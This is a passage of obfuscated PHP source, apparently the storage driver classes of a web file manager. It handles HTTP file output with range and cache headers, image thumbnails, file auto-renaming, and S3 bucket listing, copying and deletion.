$¿¡øŸÛ·[116] . $î©·ùÛ¿ . $¿¡øŸÛ·[122] . $î©·ùÛ¿; if ($Ôº»ƒ¼¢) { header($¿¡øŸÛ·[123]); header($¿¡øŸÛ·[124] . $î©·ùÛ¿); } else { header($¿¡øŸÛ·[125] . $î©·ùÛ¿); } header($¿¡øŸÛ·[126] . gmdate($¿¡øŸÛ·[110], time() + 3600 * 24 * 30) . $¿¡øŸÛ·[127]); header($¿¡øŸÛ·[128]); header($¿¡øŸÛ·[129]); header($¿¡øŸÛ·[130]); if (isset($_SERVER[$¿¡øŸÛ·[131]]) && strtotime($_SERVER[$¿¡øŸÛ·[131]]) == $‚å§ˆÛ[$¿¡øŸÛ·[84]]) { header($¿¡øŸÛ·[132], !0, 304); die; } if (isset($_SERVER[$¿¡øŸÛ·[133]]) && $_SERVER[$¿¡øŸÛ·[133]] == $ÀçÓÉ¬) { header($¿¡øŸÛ·[134] . $ÀçÓÉ¬, !0, 304); die; } header($¿¡øŸÛ·[134] . $ÀçÓÉ¬); header($¿¡øŸÛ·[135] . $ûŸÂİã¯ . $¿¡øŸÛ·[127]); header($¿¡øŸÛ·[136] . $éŸıÊÒ¬); header($¿¡øŸÛ·[137]); header($¿¡øŸÛ·[138] . $°£©ğ÷©); header($¿¡øŸÛ·[139]); if (!$Ôº»ƒ¼¢ && $ëˆü½ØŒ == $¿¡øŸÛ·[140]) { if ($°£©ğ÷© > 1024 * 1024 * 5) { die; } $ÌØšİ¶Š = $this->getContent($ê”œ¯Æ); $ÌØšİ¶Š = Html::clearSVG($ÌØšİ¶Š); header($¿¡øŸÛ·[141] . strlen($ÌØšİ¶Š)); echo $ÌØšİ¶Š; die; } $Ù´¼Î›ô = strtolower($_SERVER[$¿¡øŸÛ·[142]]); if ($Öş•ó && $Ù´¼Î›ô && $ğÃÛ¢™Ç) { if (strstr($Ù´¼Î›ô, $¿¡øŸÛ·[143])) { header($¿¡øŸÛ·[144] . $ê”œ¯Æ); } else { if (strstr($Ù´¼Î›ô, $¿¡øŸÛ·[145])) { header($¿¡øŸÛ·[146] . $ê”œ¯Æ); } else { if (strstr($Ù´¼Î›ô, $¿¡øŸÛ·[147])) { header($¿¡øŸÛ·[148] . $ê”œ¯Æ); } } } if ($Î‘• ×Í) { header($¿¡øŸÛ·[149] . $Î‘• ×Í); } return; } if (isset($_SERVER[$¿¡øŸÛ·[150]])) { if (preg_match($¿¡øŸÛ·[151], $_SERVER[$¿¡øŸÛ·[150]], $ÔŒíãÌş)) { $šÊ…™Ì˜ = intval($ÔŒíãÌş[1]); if (!empty($ÔŒíãÌş[2])) { $ôÊî÷¡£ = intval($ÔŒíãÌş[2]); } } header($¿¡øŸÛ·[152]); header("\x43\157\156\x74\145\156\164\55\x52\x61\x6e\147\145\72\x20\x62\171\x74\x65\163\x20{$šÊ…™Ì˜}\x2d{$ôÊî÷¡£}\57" . $°£©ğ÷©); } else { header($¿¡øŸÛ·[153]); } $Öó˜Š’˜ = !0; if ($_SERVER[$¿¡øŸÛ·[154]] == $¿¡øŸÛ·[155] && $°£©ğ÷© > 1204 * 1024 * 1024 * 2) { $Öó˜Š’˜ = !1; } if ($Öó˜Š’˜) { header($¿¡øŸÛ·[156] . ($ôÊî÷¡£ - $šÊ…™Ì˜ + 1)); } if ($_SERVER[$¿¡øŸÛ·[157]] == $¿¡øŸÛ·[158]) { return; } $ Ïô»·ö = 1024 * 100; $ø±œÓÚß = 0; if ($Î‘• ×Í) { $ø±œÓÚß = intval(1000 * 1000 * ($ Ïô»·ö / $Î‘• ×Í)); } while ($šÊ…™Ì˜ <= $ôÊî÷¡£) { $ğı§Ü…Ë = timeFloat(); check_abort(); $è«—‹£ = $ôÊî÷¡£ - $šÊ…™Ì˜ + 1; if ($è«—‹£ <= $ Ïô»·ö) { $ Ïô»·ö = $è«—‹£; } echo $this->fileSubstr($ê”œ¯Æ, $šÊ…™Ì˜, $ Ïô»·ö); $šÊ…™Ì˜ += $ Ïô»·ö; if ($ Ïô»·ö == $è«—‹£) { $šÊ…™Ì˜ = $ôÊî÷¡£ + 1; } if ($ø±œÓÚß) { $öı„©¯· = intval(1000 * 1000 * (timeFloat() - $ğı§Ü…Ë)); $‹¼—Ç‡¨ = $ø±œÓÚß - $öı„©¯·; if ($‹¼—Ç‡¨ > 5) { usleep($‹¼—Ç‡¨); } } } } public function fileOutServer($Ÿ£ëãé½, $üä±„¢à = false, $Ù¶Ş‡È„ = false, $ê–øî¾ = '') { $this->fileOut($Ÿ£ëãé½, $üä±„¢à, $Ù¶Ş‡È„, $ê–øî¾); } public function fileOutLink($ÂÙİ¸ïã) { header($_SERVER[¥ÙÌÜ¾ê][159] . $ÂÙİ¸ïã); die; } public function cacheMethod($±ÓÛ‹€¦, $×ñÀÁ’°, $¤ãñ¤½Ü = null) { $­¦š¨˜ß =& $_SERVER[¥ÙÌÜ¾ê]; static $„Á¤Ö‰ = array(); $«µè¢©Ì = $×ñÀÁ’° ? ltrim($this->getPathOuter($×ñÀÁ’°), $­¦š¨˜ß[8]) : $×ñÀÁ’°; $ˆŒ’¶ˆ÷ = $­¦š¨˜ß[160] . $±ÓÛ‹€¦ . $­¦š¨˜ß[161] . rtrim($«µè¢©Ì, $­¦š¨˜ß[8]); if (is_null($±ÓÛ‹€¦)) { $„Á¤Ö‰ = array(); return; } if (is_null($×ñÀÁ’°)) { unset($„Á¤Ö‰[$ˆŒ’¶ˆ÷]); return; } if (!is_null($¤ãñ¤½Ü)) { $„Á¤Ö‰[$ˆŒ’¶ˆ÷] = $¤ãñ¤½Ü; return; } $ñúÊ¤Ó¾ = isset($„Á¤Ö‰[$ˆŒ’¶ˆ÷]) ? $„Á¤Ö‰[$ˆŒ’¶ˆ÷] : null; if (!is_null($ñúÊ¤Ó¾)) { return $ñúÊ¤Ó¾; } $ñúÊ¤Ó¾ = $this->{$±ÓÛ‹€¦}($×ñÀÁ’°); $„Á¤Ö‰[$ˆŒ’¶ˆ÷] = $ñúÊ¤Ó¾; return $ñúÊ¤Ó¾; } public function fileOutImage($—ŒíğëÍ, $ú•Ó§¿› = 250) { $¶®´äáÑ =& $_SERVER[¥ÙÌÜ¾ê]; set_timeout(); if (substr($—ŒíğëÍ, 0, 4) == $¶®´äáÑ[147]) { $this->fileOutLink($—ŒíğëÍ); } $Ñî‘Ç»Æ = $this->info($—ŒíğëÍ); $à³Ì†‡Ä = $Ñî‘Ç»Æ[$¶®´äáÑ[28]]; $ÌİïĞ‘´ = !1; if (isset($GLOBALS[$¶®´äáÑ[162]]) && $GLOBALS[$¶®´äáÑ[162]][$¶®´äáÑ[76]] == $Ñî‘Ç»Æ[$¶®´äáÑ[76]]) { $£åÑ®¤ß = $GLOBALS[$¶®´äáÑ[162]][$¶®´äáÑ[163]]; if (!$Ñî‘Ç»Æ[$¶®´äáÑ[164]]) { $Ñî‘Ç»Æ[$¶®´äáÑ[164]] = $GLOBALS[$¶®´äáÑ[162]]; } if (isset($£åÑ®¤ß[$¶®´äáÑ[165]])) { if ($£åÑ®¤ß[$¶®´äáÑ[165]] <= $ú•Ó§¿› && $£åÑ®¤ß[$¶®´äáÑ[166]] <= $ú•Ó§¿›) { $ÌİïĞ‘´ = !0; } } $à³Ì†‡Ä = $Ñî‘Ç»Æ[$¶®´äáÑ[164]][$¶®´äáÑ[28]]; } if ($Ñî‘Ç»Æ[$¶®´äáÑ[78]] <= 1024 * 50 || $ÌİïĞ‘´ || !function_exists($¶®´äáÑ[167]) || $Ñî‘Ç»Æ[$¶®´äáÑ[168]] == $¶®´äáÑ[169]) { return $this->fileOut($—ŒíğëÍ, !1, $à³Ì†‡Ä); } if (isset($Ñî‘Ç»Æ[$¶®´äáÑ[164]][$¶®´äáÑ[170]])) { $‹úÆÕ¨‡ = $Ñî‘Ç»Æ[$¶®´äáÑ[164]][$¶®´äáÑ[170]]; } else { if (isset($Ñî‘Ç»Æ[$¶®´äáÑ[164]][$¶®´äáÑ[171]])) { $‹úÆÕ¨‡ = $Ñî‘Ç»Æ[$¶®´äáÑ[164]][$¶®´äáÑ[171]]; } else { $‹úÆÕ¨‡ = md5("{$Ñî‘Ç»Æ[$¶®´äáÑ[28]]}\137{$Ñî‘Ç»Æ[$¶®´äáÑ[76]]}\x5f{$Ñî‘Ç»Æ[$¶®´äáÑ[78]]}"); } } $²óõì©— = "{$‹úÆÕ¨‡}\137{$ú•Ó§¿›}\x2e\160\x6e\147"; if (!($öêÛŸ’• = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $¶®´äáÑ[172]))) { $öÅîÑÚé = IO::mkdir(IO_PATH_SYSTEM_TEMP . $¶®´äáÑ[173]); } else { $öÅîÑÚé = KodIO::make($öêÛŸ’•); } if ($öêÛŸ’• = IO::fileNameExist($öÅîÑÚé, $²óõì©—)) { $ŞìÎŸùÉ = KodIO::make($öêÛŸ’•); return IO::fileOut($ŞìÎŸùÉ, !1, $à³Ì†‡Ä); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $ŞìÎŸùÉ = DATA_THUMB . $²óõì©—; del_file($ŞìÎŸùÉ); if (!@file_exists($ŞìÎŸùÉ)) { $œ–µªƒÃ = TEMP_FILES; if (!is_dir($œ–µªƒÃ)) { mk_dir($œ–µªƒÃ); } $¦ÍÌÊú = $œ–µªƒÃ . $‹úÆÕ¨‡ . $¶®´äáÑ[95] . $Ñî‘Ç»Æ[$¶®´äáÑ[168]]; if (!@file_exists($¦ÍÌÊú)) { $¦ÍÌÊú = $this->download($—ŒíğëÍ, $¦ÍÌÊú); } ImageThumb::createThumb($¦ÍÌÊú, $ŞìÎŸùÉ, $ú•Ó§¿›, $ú•Ó§¿› * 10); } if (!file_exists($ŞìÎŸùÉ) || filesize($ŞìÎŸùÉ) < 100) { return @file_exists($¦ÍÌÊú) ? IO::fileOut($¦ÍÌÊú) : $this->fileOut($—ŒíğëÍ); } if (!($ß¦Ï‰ = IO::move($ŞìÎŸùÉ, $öÅîÑÚé))) { return IO::fileOut($ŞìÎŸùÉ); } del_file($ŞìÎŸùÉ); IO::fileOut($ß¦Ï‰); } public function fileOutImageServer($ÎÊûÏŠÎ, $‡œé¢Ó¥ = 250) { $this->fileOutImage($ÎÊûÏŠÎ, $‡œé¢Ó¥); } public function fileNameAuto($åóêšÉä, $‰·Ùùş§, $î›Î›ê“ = REPEAT_RENAME, $Ğëºë»Ø = false) { $¿ıÔ’»İ =& $_SERVER[¥ÙÌÜ¾ê]; $½ğ©¾äØ = $åóêšÉä === $¿ıÔ’»İ[33] ? $‰·Ùùş§ : rtrim($åóêšÉä, $¿ıÔ’»İ[8]) . $¿ıÔ’»İ[8] . $‰·Ùùş§; if ($î›Î›ê“ == REPEAT_REPLACE || !$this->exist($½ğ©¾äØ) || $Ğëºë»Ø && $î›Î›ê“ != REPEAT_RENAME_FOLDER) { return $‰·Ùùş§; } if ($î›Î›ê“ == REPEAT_SKIP) { return !1; } $üí­Üµ = $¿ıÔ’»İ[95] . get_path_ext($‰·Ùùş§); $üí­Üµ = $üí­Üµ == $¿ıÔ’»İ[95] || $Ğëºë»Ø ? $¿ıÔ’»İ[33] : $üí­Üµ; $‘¨°È¬Ê = 1; $¼¸Ë¹¸ö = substr($‰·Ùùş§, 0, strlen($‰·Ùùş§) - strlen($üí­Üµ)); $ò’×Œƒ’ = $¼¸Ë¹¸ö . "\x28{$‘¨°È¬Ê}\x29{$üí­Üµ}"; while ($this->exist(rtrim($åóêšÉä, $¿ıÔ’»İ[8]) . $¿ıÔ’»İ[8] . $ò’×Œƒ’)) { $ò’×Œƒ’ = $¼¸Ë¹¸ö . "\x28{$‘¨°È¬Ê}\x29{$üí­Üµ}"; $‘¨°È¬Ê++; } return $ò’×Œƒ’; } private function fileNameAutoList($æ½ä˜ô¢, $›µ£ƒ¿¹, $ÊğƒÈ‚ˆ = false) { $”¨ğµÓï =& $_SERVER[¥ÙÌÜ¾ê]; $¬“‚Ÿ¯Æ = $this->listPath($æ½ä˜ô¢, !0); $¬“‚Ÿ¯Æ = array_merge($¬“‚Ÿ¯Æ[$”¨ğµÓï[75]], $¬“‚Ÿ¯Æ[$”¨ğµÓï[74]]); $õåÅıÙ† = array_to_keyvalue($¬“‚Ÿ¯Æ, $”¨ğµÓï[33], $”¨ğµÓï[28]); $šÛ€ª”· = $”¨ğµÓï[95] . get_path_ext($›µ£ƒ¿¹); $šÛ€ª”· = $šÛ€ª”· == $”¨ğµÓï[95] || $ÊğƒÈ‚ˆ ? $”¨ğµÓï[33] : $šÛ€ª”·; $× ´Éå× = substr($›µ£ƒ¿¹, 0, strlen($›µ£ƒ¿¹) - strlen($šÛ€ª”·)); $—ò¨€ÔÅ = $× ´Éå× . "\x28\x30\51{$šÛ€ª”·}"; for ($Ş« ­šü = 1; $Ş« ­šü <= count($õåÅıÙ†) + 1; $Ş« ­šü++) { $—ò¨€ÔÅ = $× ´Éå× . "\x28{$Ş« ­šü}\51{$šÛ€ª”·}"; if (!in_array_not_case($—ò¨€ÔÅ, $õåÅıÙ†)) { return $—ò¨€ÔÅ; } } return $—ò¨€ÔÅ; } public function listAllFiles($§†ä÷Ä, $öäóŠÇ÷, $äÙ£²¥µ = array()) { $™Ë¤™¬à =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($öäóŠÇ÷)) { return array(); } $¢¶şı´™ = array(); $§†ä÷Ä = trim($§†ä÷Ä, $™Ë¤™¬à[8]); foreach ($öäóŠÇ÷ as $âÀı¥ÛÄ) { $ñ‚œÛ›á = ltrim(substr(trim($âÀı¥ÛÄ, $™Ë¤™¬à[8]), strlen($§†ä÷Ä)), $™Ë¤™¬à[8]); $¢¶şı´™ = array_merge($¢¶şı´™, $this->slicePath($ñ‚œÛ›á)); } $”ä»”ã‡ = array(); foreach (array_unique($¢¶şı´™) as $âÀı¥ÛÄ) { $Å´çÄÖú = array($™Ë¤™¬à[76] => $this->getPathOuter($™Ë¤™¬à[8] . $§†ä÷Ä . $™Ë¤™¬à[8] . $âÀı¥ÛÄ), $™Ë¤™¬à[77] => 1, $™Ë¤™¬à[78] => 0); if (substr($âÀı¥ÛÄ, -1) != $™Ë¤™¬à[8]) { $Å´çÄÖú[$™Ë¤™¬à[77]] = 0; $©ó¹ï²­ = $this->getPath($§†ä÷Ä . $™Ë¤™¬à[8] . $âÀı¥ÛÄ); $Å´çÄÖú[$™Ë¤™¬à[78]] = isset($äÙ£²¥µ[$©ó¹ï²­]) ? $äÙ£²¥µ[$©ó¹ï²­] : $this->size($©ó¹ï²­); } $”ä»”ã‡[] = $Å´çÄÖú; } return $”ä»”ã‡; } public function slicePath($ìúİ‹²”) { $€À‚‚¼ =& $_SERVER[¥ÙÌÜ¾ê]; $»ˆ©Ã¤– = explode($€À‚‚¼[8], trim($ìúİ‹²”, $€À‚‚¼[8])); $ÀÓ¹˜ş€ = 0; do { ++$ÀÓ¹˜ş€; $²ßÅÜ¶[] = implode($€À‚‚¼[8], array_slice($»ˆ©Ã¤–, 0, $ÀÓ¹˜ş€)) . $€À‚‚¼[8]; } while ($ÀÓ¹˜ş€ < count($»ˆ©Ã¤–)); $²ßÅÜ¶[count($»ˆ©Ã¤–) - 1] = $ìúİ‹²”; return $²ßÅÜ¶; } public function getHost() { $°¹á´æ =& $_SERVER[¥ÙÌÜ¾ê]; $…¿€É÷Ç = parse_url(trim($this->domain, $°¹á´æ[8])); $ˆí˜Î´’ = isset($…¿€É÷Ç[$°¹á´æ[174]]) ? $…¿€É÷Ç[$°¹á´æ[174]] : http_type(); $¡Ü¬Óç« = isset($…¿€É÷Ç[$°¹á´æ[175]]) ? $…¿€É÷Ç[$°¹á´æ[175]] : $…¿€É÷Ç[$°¹á´æ[76]]; if (isset($…¿€É÷Ç[$°¹á´æ[176]])) { $¡Ü¬Óç« .= $°¹á´æ[4] . $…¿€É÷Ç[$°¹á´æ[176]]; } return $ˆí˜Î´’ . $°¹á´æ[177] . $¡Ü¬Óç«; } public function pathEncode($ºüÕá·Â) { $òƒâ“Ã° =& $_SERVER[¥ÙÌÜ¾ê]; return str_replace($òƒâ“Ã°[178], $òƒâ“Ã°[8], rawurlencode($ºüÕá·Â)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($ØÁ¼øú) { set_timeout(); require_once SDK_DIR . $_SERVER[¥ÙÌÜ¾ê][179]; parent::__construct(); $this->_init($ØÁ¼øú); } public function _init($®£Á™²§) { foreach ($®£Á™²§ as $Óçˆ¡Ä‡ => $Ã§¾…›ë) { if (isset($this->{$Óçˆ¡Ä‡})) { $this->{$Óçˆ¡Ä‡} = $Ã§¾…›ë; } } $this->endpoint = $®£Á™²§[$_SERVER[¥ÙÌÜ¾ê][180]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Êß©™¢± = "\166\x34") { $this->signVer = $Êß©™¢±; $this->client->setSignatureVersion($Êß©™¢±); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { $¸Û•ñ˜¦ =& $_SERVER[¥ÙÌÜ¾ê]; $¡„›ÜÚ‹ = $this->getBucketCors(); if (!$¡„›ÜÚ‹ || !is_array($¡„›ÜÚ‹)) { return !1; } if ($¡„›ÜÚ‹[$¸Û•ñ˜¦[181]] != $¸Û•ñ˜¦[182] || $¡„›ÜÚ‹[$¸Û•ñ˜¦[183]] != $¸Û•ñ˜¦[182]) { return !1; } $óòÎâı¶ = array_map($¸Û•ñ˜¦[184], $¡„›ÜÚ‹[$¸Û•ñ˜¦[185]]); if (!is_array($óòÎâı¶)) { $óòÎâı¶ = array(); } $€ßı‹˜Å = array($¸Û•ñ˜¦[186], $¸Û•ñ˜¦[187], $¸Û•ñ˜¦[188], $¸Û•ñ˜¦[189], $¸Û•ñ˜¦[190]); $£€¼³îï = array_diff($€ßı‹˜Å, $óòÎâı¶); return empty($£€¼³îï); } public function mkfile($´öçë«ª, $Í–äö¼é = '', $ò–ÓÛ÷« = REPEAT_RENAME) { $éªá½” = $this->setContent($´öçë«ª, $Í–äö¼é); if ($éªá½” !== !1) { return $this->getPathOuter($´öçë«ª); } return !1; } public function mkdir($­›–­—ô, $ÅğÚ¹í¬ = REPEAT_SKIP) { $Õ¯Ï¸‰İ =& $_SERVER[¥ÙÌÜ¾ê]; if (empty($­›–­—ô) && $­›–­—ô !== $Õ¯Ï¸‰İ[191]) { return !1; } if ($this->_isFolder($­›–­—ô)) { return $this->getPathOuter($­›–­—ô); } $ËĞ´‘æú = $this->setContent($­›–­—ô, $Õ¯Ï¸‰İ[33], !0); if ($ËĞ´‘æú !== !1) { return $this->getPathOuter($­›–­—ô); } return !1; } public function copyFile($›ˆÉ…Êâ, $Ë¸„ƒ§ù, $ú…ìûêĞ = array()) { $Š–³³¥Á =& $_SERVER[¥ÙÌÜ¾ê]; $ğï—ôÀÏ = $this->objectMeta($›ˆÉ…Êâ); if (!$ğï—ôÀÏ) { return !1; } if ($ğï—ôÀÏ[$Š–³³¥Á[78]] <= 1024 * 1024 * 200) { $Ü¸òª¾§ = $this->client->copyObject($this->bucket, $›ˆÉ…Êâ, $this->bucket, $Ë¸„ƒ§ù, $Š–³³¥Á[192], $ú…ìûêĞ); } else { $Ü¸òª¾§ = $this->client->multiCopyObject($this->bucket, $›ˆÉ…Êâ, $this->bucket, $Ë¸„ƒ§ù, $ú…ìûêĞ); } $Ü¸òª¾§ = $Ü¸òª¾§ ? $this->getPathOuter($Ë¸„ƒ§ù) : !1; return $Ü¸òª¾§; } public function moveFile($¼şÜ¬¬¦, $½´÷óÇ¢) { if ($this->copyFile($¼şÜ¬¬¦, $½´÷óÇ¢)) { $this->delFile($¼şÜ¬¬¦); return $this->getPathOuter($½´÷óÇ¢); } return !1; } public function delFile($‚˜ÑÉ¤¹) { return $this->client->deleteObject($this->bucket, $‚˜ÑÉ¤¹); } public function delFolder($°ª„ªˆ) { $–  ©„™ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$this->exist($°ª„ªˆ)) { return !0; } $this->listItemCache = !1; $á¼‹÷Îˆ = $this->fileList($°ª„ªˆ); $this->listItemCache = !0; $‚Õõ€—ñ = trim($°ª„ªˆ, $–  ©„™[8]) . $–  ©„™[8]; if (!empty($°ª„ªˆ) && $°ª„ªˆ !== $–  ©„™[191] && !in_array($‚Õõ€—ñ, $á¼‹÷Îˆ[$–  ©„™[75]])) { $á¼‹÷Îˆ[$–  ©„™[75]][] = $‚Õõ€—ñ; } $õø—×‚¾ = $this->delByBatch($á¼‹÷Îˆ[$–  ©„™[74]]); if (!$õø—×‚¾) { return !1; } $õø—×‚¾ = $this->delByBatch($á¼‹÷Îˆ[$–  ©„™[75]]); if (!$õø—×‚¾) { return !1; } return $this->delFile($‚Õõ€—ñ); } private function delByBatch($ºÂñ¸Ş³) { foreach (array_chunk($ºÂñ¸Ş³, 1000) as $ ¥Ã’ÖŞ) { $ù¸ø°“É = $this->client->deleteObjects($this->bucket, $ ¥Ã’ÖŞ); if (!$ù¸ø°“É) { return !1; } } return !0; } public function rename($İñşÁ±„, $ß°Åà¶±) { return $this->renameObject($İñşÁ±„, $ß°Åà¶±); } public function listPath($¤†ùğ¢È, $™ƒüû¿Ã = false) { $Ê³ë¯Íæ =& $_SERVER[¥ÙÌÜ¾ê]; $ÅòŞ’Øº = $this->fileList($¤†ùğ¢È, $Ê³ë¯Íæ[8], !0); foreach ($ÅòŞ’Øº[$Ê³ë¯Íæ[75]] as $¥İÈ…¸ => $”»Æ§á) { $ÅòŞ’Øº[$Ê³ë¯Íæ[75]][$¥İÈ…¸] = $this->folderInfo($”»Æ§á, $™ƒüû¿Ã); } foreach ($ÅòŞ’Øº[$Ê³ë¯Íæ[74]] as $¥İÈ…¸ => $”»Æ§á) { $ÅòŞ’Øº[$Ê³ë¯Íæ[74]][$¥İÈ…¸] = $this->fileInfo($”»Æ§á[$Ê³ë¯Íæ[28]], $™ƒüû¿Ã, $”»Æ§á); } return $ÅòŞ’Øº; } private function fileInfo($…÷ïÎêå, $˜ÚÅ³ı× = false, $Ñ“‰Ö›­ = array()) { $£•–Ã¢‰ =& $_SERVER[¥ÙÌÜ¾ê]; $èÓ“Ü¥Š = array($£•–Ã¢‰[28] => $this->pathThis($…÷ïÎêå), $£•–Ã¢‰[76] => $this->getPathOuter($…÷ïÎêå), $£•–Ã¢‰[29] => $£•–Ã¢‰[193], $£•–Ã¢‰[168] => $this->ext($…÷ïÎêå), $£•–Ã¢‰[78] => isset($Ñ“‰Ö›­[$£•–Ã¢‰[78]]) ? $Ñ“‰Ö›­[$£•–Ã¢‰[78]] : 0); if ($˜ÚÅ³ı×) { return $èÓ“Ü¥Š; } $èÓ“Ü¥Š[$£•–Ã¢‰[194]] = $èÓ“Ü¥Š[$£•–Ã¢‰[84]] = 0; $èÓ“Ü¥Š[$£•–Ã¢‰[195]] = $èÓ“Ü¥Š[$£•–Ã¢‰[196]] = !0; if (empty($Ñ“‰Ö›­)) { $Ñ“‰Ö›­ = $this->objectMeta($…÷ïÎêå); if (!$Ñ“‰Ö›­) { return $èÓ“Ü¥Š; } } if (isset($Ñ“‰Ö›­[$£•–Ã¢‰[197]])) { $èÓ“Ü¥Š[$£•–Ã¢‰[84]] = $Ñ“‰Ö›­[$£•–Ã¢‰[197]]; } if (isset($Ñ“‰Ö›­[$£•–Ã¢‰[78]])) { $èÓ“Ü¥Š[$£•–Ã¢‰[78]] = $Ñ“‰Ö›­[$£•–Ã¢‰[78]]; } return $èÓ“Ü¥Š; } private function folderInfo($îÆµ‘Áº, $‚©Ú¹†ğ = false) { $ÀÍœˆÚ =& $_SERVER[¥ÙÌÜ¾ê]; $—Ãñ„Æ‹ = array($ÀÍœˆÚ[28] => $this->pathThis($îÆµ‘Áº), $ÀÍœˆÚ[76] => $this->getPathOuter($ÀÍœˆÚ[8] . $îÆµ‘Áº), $ÀÍœˆÚ[29] => $ÀÍœˆÚ[77]); if ($‚©Ú¹†ğ) { return $—Ãñ„Æ‹; } $—Ãñ„Æ‹[$ÀÍœˆÚ[194]] = $—Ãñ„Æ‹[$ÀÍœˆÚ[84]] = 0; $—Ãñ„Æ‹[$ÀÍœˆÚ[195]] = $—Ãñ„Æ‹[$ÀÍœˆÚ[196]] = !0; if ($îÆµ‘Áº == $ÀÍœˆÚ[33]) { return $—Ãñ„Æ‹; } $îÆµ‘Áº = trim($îÆµ‘Áº, $ÀÍœˆÚ[8]) . $ÀÍœˆÚ[8]; $‡íÆ™Ú = $this->objectMeta($îÆµ‘Áº); if (isset($‡íÆ™Ú[$ÀÍœˆÚ[197]])) { $—Ãñ„Æ‹[$ÀÍœˆÚ[194]] = $‡íÆ™Ú[$ÀÍœˆÚ[197]]; } return $—Ãñ„Æ‹; } private function fileList($¬´¨ÕŠ…, $ò¤öô×È = '', $åøßÇ“¹ = 0) { $¿‚·©Óù =& $_SERVER[¥ÙÌÜ¾ê]; $˜‡ë¿‘Ö = rtrim($¬´¨ÕŠ…, $¿‚·©Óù[8]) . $¿‚·©Óù[8]; $ğñ¤Ñø— = $this->listObjs($˜‡ë¿‘Ö, null, null, $ò¤öô×È); if (!$ğñ¤Ñø—) { return array($¿‚·©Óù[75] => array(), $¿‚·©Óù[74] => array()); } $¸‰»—Û = $this->listItemCache === !1 ? !1 : !0; $×ë»ú©¬ = $îËÔİÜı = array(); foreach ($ğñ¤Ñø—[$¿‚·©Óù[198]] as $…Ÿ½±ªç) { $ÎôÉ€Ğ“ = $…Ÿ½±ªç[$¿‚·©Óù[28]]; if ($ÎôÉ€Ğ“ == $˜‡ë¿‘Ö) { continue; } $±İÑÎŠ® = isset($…Ÿ½±ªç[$¿‚·©Óù[78]]) ? $…Ÿ½±ªç[$¿‚·©Óù[78]] : 0; $™íÚµ­ = $±İÑÎŠ® == 0 && substr($ÎôÉ€Ğ“, strlen($ÎôÉ€Ğ“) - 1, 1) == $¿‚·©Óù[8] ? !0 : !1; if ($¸‰»—Û) { $this->cacheMethod($¿‚·©Óù[199], $ÎôÉ€Ğ“, $™íÚµ­); $this->cacheMethod($¿‚·©Óù[200], $ÎôÉ€Ğ“, $…Ÿ½±ªç); } if ($™íÚµ­) { $×ë»ú©¬[] = $ÎôÉ€Ğ“; continue; } $îËÔİÜı[] = $åøßÇ“¹ ? $…Ÿ½±ªç : $ÎôÉ€Ğ“; } foreach ($ğñ¤Ñø—[$¿‚·©Óù[201]] as $…Ÿ½±ªç) { $×ë»ú©¬[] = $…Ÿ½±ªç[$¿‚·©Óù[28]]; if ($¸‰»—Û) { $this->cacheMethod($¿‚·©Óù[199], $…Ÿ½±ªç[$¿‚·©Óù[28]], !0); } } if ($¸‰»—Û) { $this->cacheMethod($¿‚·©Óù[199], $¬´¨ÕŠ…, !0); } return array($¿‚·©Óù[75] => $×ë»ú©¬, $¿‚·©Óù[74] => $îËÔİÜı); } private function listObjs($ğü« ¤÷, $Û²Êçı = null, $¼ºş©Æò = null, $·½´ÓË¾ = null) { $Ï¼Ñó±Ğ =& $_SERVER[¥ÙÌÜ¾ê]; $ğü« ¤÷ = trim($ğü« ¤÷, $Ï¼Ñó±Ğ[8]); $î¶‰Îá = empty($ğü« ¤÷) && $ğü« ¤÷ !== $Ï¼Ñó±Ğ[191] ? $Ï¼Ñó±Ğ[33] : $ğü« ¤÷ . $Ï¼Ñó±Ğ[8]; return $this->client->getBucket($this->bucket, $î¶‰Îá, $Û²Êçı, $¼ºş©Æò, $·½´ÓË¾, !0); } public function has($“ôÇé£€, $»ä±‹ÃŠ = false, $½å–èã = true) { $Í«Á £ =& $_SERVER[¥ÙÌÜ¾ê]; $“ôÇé£€ = trim($“ôÇé£€, $Í«Á £[8]); $ÍÚÇğ´ = empty($“ôÇé£€) && $“ôÇé£€ !== $Í«Á £[191] ? $Í«Á £[33] : $“ôÇé£€ . $Í«Á £[8]; $ÖÚ¿€€È = null; $šİº = 500; $›‰æïÖÀ = $Í«Á £[8]; $õÄÜøäµ = $Ü­¨ğ«Ú = array(); while (!0) { $âÈüäëÑ = $this->listObjs($“ôÇé£€, $ÖÚ¿€€È, $šİº, $›‰æïÖÀ); if (!$âÈüäëÑ) { break; } $ÖÚ¿€€È = $âÈüäëÑ[$Í«Á £[202]]; $èÎ‹Ø¿ = $âÈüäëÑ[$Í«Á £[198]]; $Œ‚óíã = $âÈüäëÑ[$Í«Á £[201]]; if (empty($èÎ‹Ø¿) && empty($Œ‚óíã)) { break; } if (count($èÎ‹Ø¿) == 1 && $èÎ‹Ø¿[0][$Í«Á £[28]] == $ÍÚÇğ´) { break; } if ($»ä±‹ÃŠ) { if (count($èÎ‹Ø¿)) { $èÎ‹Ø¿ = array_column($èÎ‹Ø¿, $Í«Á £[28]); $õÄÜøäµ = array_merge($õÄÜøäµ, $èÎ‹Ø¿); } if (count($Œ‚óíã)) { $Œ‚óíã = array_column($Œ‚óíã, $Í«Á £[28]); $Ü­¨ğ«Ú = array_merge($Ü­¨ğ«Ú, $Œ‚óíã); } if ($ÖÚ¿€€È === null) { break; } continue; } if ($½å–èã) { if (!empty($èÎ‹Ø¿)) { if (count($èÎ‹Ø¿) > 1 || isset($èÎ‹Ø¿[0][$Í«Á £[28]]) && $èÎ‹Ø¿[0][$Í«Á £[28]] != $ÍÚÇğ´) { return !0; } } } else { if (!empty($Œ‚óíã)) { return !0; } } if ($ÖÚ¿€€È === null) { break; } } if 